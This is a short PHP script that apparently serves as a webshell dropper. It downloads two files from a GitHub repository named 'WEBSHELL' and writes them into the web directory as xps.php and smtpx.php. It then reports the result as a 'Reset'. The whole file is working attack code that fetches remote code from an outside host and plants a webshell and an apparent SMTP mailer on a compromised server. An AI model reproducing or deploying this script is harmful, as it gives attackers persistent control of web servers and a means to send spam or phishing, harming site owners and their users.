<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = "./xps.php" ;
$text = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/xp.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo "Done Reset ===>  ".$check."</br>";
}else 
echo "Fail Reset" ;
$check2 = "./smtpx.php" ;
$text2 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/smtpx.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo "Done Reset ===>  ".$check2."</br>";
}else 
echo "Fail Reset" ;
?>
